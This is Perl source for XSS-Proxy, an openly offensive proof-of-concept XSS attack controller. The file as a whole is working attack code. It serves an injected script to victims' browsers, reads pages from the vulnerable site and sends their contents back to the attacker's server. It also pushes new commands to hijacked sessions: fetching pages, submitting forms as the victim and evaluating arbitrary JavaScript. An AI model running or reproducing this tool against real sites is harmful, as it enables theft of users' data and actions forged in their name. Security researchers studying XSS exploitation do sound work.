#!/usr/bin/perl

use IO::Socket;

# unbuffered output
$|=1; 

# XSS-Proxy.pl
#
# Anton Rager - a_rager@yahoo.com
# PoC code for advanced controlled
# XSS attacks

# 0.0.12 - updated initial PoC for:
# -- working file:// URLs with Windows and Linux
# -- URL rewriting updated to deal with no trailing slash on dirnames
# 0.0.11 - initial Shmoocon PoC code


# This script is an XSS attack controller and allows 
# an attacker to force a victim to read pages off a
# XSS vulnerable server and relay contents back to 
# this controller. This process also provides client
# with new script commands 
# 
# Attacker access controller via document /admin and
# can review captured document, submit commands to zombies
# and submit forms to target sites using specific zombies
#
# - Program allows loading of local (same document.domain)
#   documents and content reading
# - Recorded document links are modified to ref our attack
#   server
# - Program allows loading of non-local documents, attempted
#   content reading and error exception handling/recovery
# - Program allows javascript variables and expressions to
#   be forwarded to victim for evaluation and contents recorded
# - submit refs are reworked to always put values and methods
#   on a GET request to our attack server (admin frags?)
# - next: traverse off link logic
# - next: CSRF based XSS fuzzing and validation
# 
# known bugs:
# - Attacker URL rewriting is partial. 
# --  Issues with single and non-quoted HREFs
# --  (Double should be ok in most cases)
# --  relative HREF with prior doc a file ref will fail
# --  Issues with single quoted form action
# --  (Double and non-qoute should work)
# - Frag handler is not multi-session - two responses will step
#   on each other
# - Frag handler does not deal with frag after 'final' request
#   sometimes this will dorkup a document - I need to change
#   the frag logic to have a seq and total for reassembly
# - No Frag handling for attacker submits
# - Form logic only deals with numeric form refs - named form
#   not implemented as not all HTML has names on form elements
# - The 2sec sleep on NULL requests is intentional - Firefox needs a delay
#   for some reason before loading the idle loop (IE is ok without)
# prob lots more....


# Global var/defaults - this will end up in cmd_line someday

$version = "0.0.12";
 
# MS IE - 2047char limit on URL, so we strip payload to 
# chunks of 2047 bytes.
# Firefox goes past that limit without problems (Firefox gets odd around 20K).
$urlbuffer="2047";

# Timer for wait event before reading document contents 
#   tune to doc size and link speeds
#$loadtimer="6500";
$loadtimer="12000";
#$loadtimer="24000";

# URL that injection vector will specify
$code_server = "http://localhost";

# Port XSS-Proxy listens on 
$server_port = 80;

# load root of document.domain - or else set this to something else
$init_dir = "/";


print("XSS-Proxy Controller\n--version ",$version, "\n--by Anton Rager (a_rager\@yahoo.com)\n");
print("Options:\n-XSS-Proxy code server base URL: $code_server\n");
print("-Basic XSS vector will be: <script src=\"$code_server/xss2.js\"></script>\n");
print("-Initial hijack dir: $init_dir\n-XSS-Proxy server will run on port: $server_port\n\n");



# Jscript for loading first doc, loading showDoc function, 
# reading contents and xmitting to controller
# - controller supplies new code on last xmit
# This will become initcode

sub init_session {
 my ($sessionID, $document) = @_;
 my $raw_code2 = "

function showDoc(pageName) {
  var ack=0;
  var sessionID=\"$sessionID\";
  urlname =  escape(window.frames[0].document.location);
  var nodesLen = window.frames[0].document.childNodes.length;
  for (x=0;x<nodesLen;x++) {
    if (window.frames[0].document.childNodes[x].tagName == \'HTML\') {
       sendBack =  escape(window.frames[0].document.childNodes[x].innerHTML);
    }
  }
  var serverLen = \"$code_server\".length;
  var counter=0;
  for (start=0;start<sendBack.length;) {
    var tempHeader = \'\\\&session=\' + sessionID + \'\\\&docname=\' + urlname + \'\\\&seq=\' + counter + \'\\\&data=\';
    var tempURL = tempHeader + sendBack.substring(start);
    // There's a bug here -- I had to force a -2 to get frag to within 2047
    if (tempURL.length+serverLen+7 <= $urlbuffer) {
      command = pageName;
      snd0Back = tempURL;
     start = sendBack.length;
    } else {
      command = \"null\";
      start = start + ($urlbuffer-serverLen-command.length-2-tempHeader.length);
      snd0Back=tempURL.substring(0,$urlbuffer-serverLen-command.length-2);
    }
    counter++;
    var scriptTag = document.getElementById(\'loadScript\'+counter); 
    var head = document.getElementsByTagName(\'head\').item(0);  
    if(scriptTag) head.removeChild(scriptTag);  
    script = document.createElement(\'script\');
    script.src = \'$code_server/\'+command+\'\\\?\'+snd0Back
    script.type = \'text/javascript\';
    script.id = \'loadScript\'+counter;
    head.appendChild(script);
  }
};
function scriptRequest(retval) {
    if (retval) {
      parms=\'\\\&session=\' + sessionID + \'\\\&return=\' + escape(retval);
    } else {
      parms=\'\\\&session=\' + sessionID + \'\\\&loop\';
    }
    var scriptTag = document.getElementById(\'loadScript\');
    var head = document.getElementsByTagName(\'head\').item(0);
    if(scriptTag) head.removeChild(scriptTag);
    script = document.createElement(\'script\');
    script.src = \'$code_server/\'+\'page2\\\?\' + parms
    script.type = \'text/javascript\';
    script.id = \'loadScript\';
    head.appendChild(script);

};
function reportError(message, url, lineNumber) {
  if (message == \"uncaught exception: Permission denied to get property HTMLDocument.location\" || message == \"Access is denied.\\r\\n\") {
    var formTag = document.getElementById(\'targetFrame\');
    formTag.parentNode.removeChild(formTag);
    var iframeObj = document.createElement('IFRAME');
    iframeObj.src = basedom+\'$document\';
    iframeObj.name = \'targetFrame\';
    iframeObj.id = \'targetFrame\';
    document.body.appendChild(iframeObj);
    var scriptTag = document.getElementById(\'loadScript31337\');
    var head = document.getElementsByTagName(\'head\').item(0);
    if(scriptTag) head.removeChild(scriptTag);
    script = document.createElement(\'script\');
    script.src = \'$code_server/\'+\'page2\\\?\\\&session=\' + sessionID + \'\\\&error=\' + escape(message)
    script.type = \'text/javascript\';
    script.id = \'loadScript31337\';
    head.appendChild(script);
  
  } else if (message != \"Error loading script\") {
    var scriptTag = document.getElementById(\'loadScript31337\');
    var head = document.getElementsByTagName(\'head\').item(0);
    if(scriptTag) head.removeChild(scriptTag);
    script = document.createElement(\'script\');
    script.src = \'$code_server/\'+\'page2\\\?\\\&session=\' + sessionID + \'\\\&error=\' + escape(message)
    script.type = \'text/javascript\';
    script.id = \'loadScript31337\';
    head.appendChild(script);
   } 
   return true;

};

var ack=0;
var sessionID=\"$sessionID\";
window.onerror=reportError;
if (!document.domain && \'$document\' == \'/\') {
 if(navigator.userAgent.indexOf(\"Windows\")) {
   basedom = \'file:///c:\';
 } else {
   basedom = \'file:///\';
 }
} else {
   basedom = \'\';
}
document.write(\'<IFRAME id=\"targetFrame\" name=\"targetFrame\" frameborder=0 scrolling=\"no\" width=100 heigth=100 src=\"\'+basedom+\'$document\")></iframe>\');
setTimeout(\"showDoc(\\\'page2\\\')\",$loadtimer);
";

return($raw_code2);

}


# Loadpage
sub getdoc {
 my ($document) = @_;
 my $raw_code3 = "
window.frames[0].document.location=\"$document\";setTimeout(\"showDoc(\\\'page2\\\')\",$loadtimer);
";

  return($raw_code3);
}

sub postdoc {
 my ($document, $form_name, $field_vals) = @_;
 my @fields_array = split(/\&/,$field_vals);
 my $posttimer = $loadtimer*4;
 shift(@fields_array); # 1st is null
 my $script_code = "if (window.frames[0].document.location == \"$document\" || window.frames[0].document.location+\"/\" == \"$document\") {";
 foreach $input_tag (@fields_array) {
   my @varpair = split(/=/,$input_tag);
   $varpair[0] = &URLDecode($varpair[0]);
   $varpair[1] = &URLDecode($varpair[1]);
   $script_code .= "window.frames[0].document.forms$form_name.$varpair[0].value=\"$varpair[1]\";";
 }
 $script_code .= "
   window.frames[0].document.forms$form_name.submit();
   setTimeout(\"showDoc(\\\'page2\\\')\",$posttimer);
 } else { 
   reportError(\"XSS submit with invalid doc loaded\");
 }";

 return($script_code);
}

sub idler {
 #command loop / idler
 my $idle_code = "
setTimeout(\"scriptRequest()\",$loadtimer); 
";
 return($idle_code);
}

# Evaluate
# Loadpage
sub evalscript {
 my ($submitcode) = @_;
 my $eval_code = "
var result=$submitcode;
if (!result) {
  result = \"No value for expression\";
}
setTimeout(\"scriptRequest(result)\",$loadtimer);
";
 return($eval_code);
}

$newline = "\x0D\x0A";
$session=0;

# main server 
$server = IO::Socket::INET->new( Proto     => 'tcp',
                                  LocalPort => $server_port,
                                  Listen    => SOMAXCONN,
                                  Reuse     => 1);
                                                                  
 die "can't setup server" unless $server;
 print("[Server $0 accepting clients at $code_server]\n");

 print("Starting Main Listener Loop\n\n");
 while ($client = $server->accept()) {
   $client->autoflush(1);
   my $request = <$client>;

   $other_end = getpeername($client);
   ($iport, $iaddr) = unpack_sockaddr_in($other_end);
   $client_ip = inet_ntoa($iaddr);

   print("Request: $request\n");
   if ($request =~ m|^GET /(.+?)\?(.+?) HTTP/1.[01]|) {
#     print("two parms: 1st: $1\n");
#     print("second: $2\n\n");
      if ($1 eq "null") {
#         print($client "HTTP/1.0 404 FILE NOT FOUND\n");
         print($client "HTTP/1.1 200 OK\n");
         print($client "Content-Type: text/plain\n");
         print($client "Cache-control: no-cache\n\n");
         print $client "ack++;"; #send nothing
sleep(2); #orig = 2
         $quotetest = $2;
         if ($quotetest =~ m/\&session=(.+?)\&docname=(.+?)\&seq=(.+?)\&data=(.+?)$/) {
           $doc_name = "host: " . $client_ip. " Document: " .  &URLDecode($2);
           $null_var[$3] = $4;
           print("Frag - Doc: $doc_name\n");
         } else {
           print("Error...\n");
         }
#         if ($sessionstate[$1] eq "init") {
#         }
         $sessionstate[$1] = "fetch: $2 frag_seq_$3";
         $statetime[$1] = time();
      } elsif ($1 eq "page2") {
         print($client "HTTP/1.1 200 OK\n");
         print($client "Content-Type: text/plain\n");
         print($client "Cache-control: no-cache\n\n");
         $quotetest = $2;
         if ($quotetest =~ m/\&session=(.+?)\&docname=(.+?)\&seq=(.+?)\&data=(.+?)$/) {
           $sess=$1;
           $doc_name = "host: " . $client_ip. " session: " . $sess. " Document: " .  &URLDecode($2);
           $null_var[$3] = $4;
           print("Frag - Doc: $doc_name\n");
           for ($x=0;$x<$3+1;$x++) {
             if ($null_var[$x]) {
             $doc_contents .= $null_var[$x];
             } else {
               print("Missing seq $3\n");
             }
           }
           push(@snapshot, &URLDecode($doc_contents));
           push(@snapname, $doc_name);
           @null_var=();
           $doc_contents="";
           $doc_name="";
           $sessionstate[$sess] = "fetched: $2";
           $statetime[$sess] = time();

         } elsif ($quotetest =~ m/\&session=(.+?)\&return=(.+?)$/) {
           $sess=$1;
           $result_sum = "host: " . $client_ip. " session: " . $sess." Expression: " . &URLDecode($jeval[$sess])." Result: " .  &URLDecode($2);
           push(@resultlist, &URLDecode($result_sum));
           $result_sum="";
           $sessionstate[$sess] = "eval_resp";
           $statetime[$sess] = time();

         } elsif ($quotetest =~ m/\&session=(.+?)\&error=(.+?)$/) {
           $sess=$1;
           $error_sum = "host: " . $client_ip. " session: " . $sess." Message: " .  &URLDecode($2);
           push(@errorlist, &URLDecode($error_sum));
           $error_sum="";
           $sessionstate[$sess] = "error_resp";
           $statetime[$sess] = time();

         } elsif ($quotetest =~ m/\&session=(.+?)\&loop/) {
           $sess=$1;
           $sessionstate[$sess] = "poll_resp";
           $statetime[$sess] = time();

         }
         if ($command[$sess] eq "getdoc") {
           $raw_code3 = &getdoc(&URLDecode($document_list[$sess]));
           print("Load Document: $document_list[$sess]\n");
           $command[$sess]="";
           print($client $raw_code3);
           $sessionstate[$sess] = "fetch_req $document_list[$sess]";
           $statetime[$sess] = time();

         } elsif ($command[$sess] eq "postdoc") {
           print("postdoc to $sess\n");
           $raw_code3 = &postdoc(&URLDecode($document_list[$sess]),&URLDecode($form_list[$sess]), $formvars[$sess]);
           $command[$sess]="";
           print($client $raw_code3);
           $sessionstate[$sess] = "postdoc_req $document_list[$sess] $form_list[$sess]";
           $statetime[$sess] = time();


         } elsif ($command[$sess] eq "jeval") {
           $raw_code3 = &evalscript(&URLDecode($jeval[$sess]));
           $command[$sess]="";
           print($client $raw_code3);
           $sessionstate[$sess] = "eval_req $jeval[$sess]";
           $statetime[$sess] = time();

         } else {
           $raw_code3 = &idler;
           print($client $raw_code3);
           $sessionstate[$sess] = "idle_req";
           $statetime[$sess] = time();
         }
         print("$raw_code3\n");

      } elsif ($1 eq "admin") {
         print($client "HTTP/1.0 200 OK\nContent-Type: text/html\n\n");
         if ($2=~m/docid=(.+?)$/) {
#           print($client $snapshot[$1]);
            # replace all local / same docdomain refs with getdoc refs
            $displaydoc = $snapshot[$1];
            $snapname[$1] =~ m/.+session: (.+?) Document: (.+)$/;
            $displaysession = $1;
            $displayloc = $2;
if (substr($displayloc,-1,1) ne "/") {
	print("adding a slash to end of display location\n");
	$displayloc = $displayloc . "/";
}

            print("session: $displaysession document name: $displayloc\n");

# Still need to fix relative pathname extraction - borken if filename on
# end
            $displaydoc =~ s/(<base href=")(.+?>)/$1\/admin?session=$displaysession&loaddoc=$2/gi;
            $displaydoc =~ s/(<a.+?href=\")([^#].+?\">)/$1$code_server\/admin?session=$displaysession&loaddoc=$2/gi;
           $displaydoc =~ s/(<a.+?href=\"$code_server\/admin\?session=$displaysession&loaddoc=)(([^h\/]|h[^t]|ht[^t]|htt[^p]|http[^:]).+?\">)/$1$displayloc$2/gi;

# form action rewriting
$displaydoc =~ s/(<form.+?action=)\".+?\"/$1\"$code_server\/admin\"/gi;

#same for actions with no quotes
$displaydoc =~ s/(<form.+?action=)[^\"].+?([ >])/$1\"$code_server\/admin\"$2/gi;

# add our special fields for XSS proxy on attacker side and a xss-proxy submit 
# for JS triggered forms.
my $fcount=0;
$displaydoc =~ s/(<form.+?>)/$fcount++;sprintf('%s<input type="hidden" name="__session" value="%s"><input type="hidden" name="__postdoc" value="%s"><input type="hidden" name="__formname" value="[%d]"><input type="submit" value="XSS-Proxy Submit">',$1,$displaysession,$displayloc,$fcount-1)/egi;

# convert any POST method to GET
$displaydoc =~ s/(<form.+?method=)\".+?\"/$1\"get\"/gi;
$displaydoc =~ s/(<form.+?method=)[^\"].+?[ >]/$1\"get\"/gi;

           print($client $displaydoc);

         } elsif ($2=~m/session=(.+?)&loaddoc=(.+?)$/) {
           $command[$1]="getdoc";
           $document_list[$1]=$2;
           print($client "Submitted Document to Fetch: ", &URLDecode($2) ," to session $1<br><br><br><a href=\"/admin\">return to main</a>");

         } elsif ($2=~m/__session=(.+?)&__postdoc=(.+?)&__formname=(.+?)(&.+)$/) {
           $command[$1]="postdoc";
           $document_list[$1]=$2;
           $form_list[$1]=$3;
           $formvars[$1]=$4;
           print($client "Submitted Form from Document: ",&URLDecode($2),", form ",&URLDecode($3)," to session $1<br>contents: ",&URLDecode($4),"<br><br><a href=\"/admin\">return to main</a>");

         } elsif ($2=~m/session=(.+?)&jeval=(.+?)$/) {
           $command[$1]="jeval";
           $jeval[$1]=$2;
           print($client "Submitted Script Expression: ",&URLDecode($2), " to session $1<br><br><br><a href=\"/admin\">return to main</a>");
         }

      } else {
       print($client "HTTP/1.0 404 FILE NOT FOUND\n");
       print($client "Content-Type: text/plain\n\n");
       print($client "file $1 not found\n");
      }


   } elsif ($request =~ m|^GET /(.+) HTTP/1.[01]|) {
#       print("$1\n");
     if ($1 eq "xss2.js") {
          # create new state for this client/XSS document
          # push ip + init docname to clients array
          print("script request for script $1\n");
          print($client "HTTP/1.1 200 OK\n");
          print($client "Content-Type: text/plain\n");
          print($client "Cache-control: no-cache\n\n");
          # new session 
          $sessionlist[$session]="$client_ip";
          $sessionstate[$session] = "init";
          $statetime[$1] = time();

          $raw_code2 = &init_session($session,$init_dir);

          print($client $raw_code2);      
	  print("content: $raw_code2\n");
          $session++; # update for next session
      } elsif ($1 eq "admin") {
          print($client "HTTP/1.0 200 OK\nContent-Type: text/html\n\n");
          print("Admin connection from $client_ip\n\r");
          print($client "<html><title>Admin Page</title><b>XSS-Proxy Controller Session</b><br><br>");
          print($client "<br>Fetch document:<form name=\"docname\" id=\"docname\"><input name=\"session\"><input name=\"loaddoc\"><input type=\"submit\" value=\"Submit\"></form>");
          print($client "Evaluate:<form name=\"scriptlett\" id=\"scriptlette\"action=\"$code_server/admin?\"><input name=\"session\"><input name=\"jeval\"><input type=\"submit\" value=\"Submit\"></form><br><br>");

          if (scalar(@sessionlist)) {
            print($client "<b>Clients:</b><br>");
            for ($looper=0;$looper<scalar(@sessionlist);$looper++) {
              $time_interval = time()-$statetime[$looper];
              $msg="";
              if ($time_interval > 10) {
                 $msg="dead session?";
              }
              print($client "host $sessionlist[$looper] session: $looper - last state: $sessionstate[$looper] time: ($time_interval sec ago)$msg<br>");
            }
            if (scalar(@snapshot) || scalar(@resultlist) || scalar(@errorlist)) {
             print($client "<br><b>Document Results:</b><br>");
             $counter=0;
             foreach $snappage (@snapshot) {
              print($client "<a href=\"",$code_server,"/admin?docid=$counter\">",$snapname[$counter], "</a><br>");
              $counter++;
            }
            print($client "<br><b>Eval Results:</b><br>");
            foreach $result_info (@resultlist) {
              print($client "$result_info<br>");
            }
            print($client "<br><b>Errors:</b><br>");
            foreach $error_info (@errorlist) {
              print($client "$error_info<br>");
            }
           }

          } else {
            print($client "No contents yet - Waiting for Vixtim to forward some documents<br><br>\n $newline");
          }

      } else {
        print($client "HTTP/1.0 404 FILE NOT FOUND\n");
        print($client "Content-Type: text/plain\n\n");
        print($client "file $1 not found\n");
      }
   } else {
      print("Bad Request\n");
      print($client "HTTP/1.0 400 BAD REQUEST\n");
      print($client "Content-Type: text/plain\n\n");
      print($client "BAD REQUEST\n");
   }
       close($client);
 }
 
  
sub URLDecode {
    my $theURL = $_[0];
    $theURL =~ s/%([a-fA-F0-9]{2,2})/chr(hex($1))/eg;
    return $theURL;
}
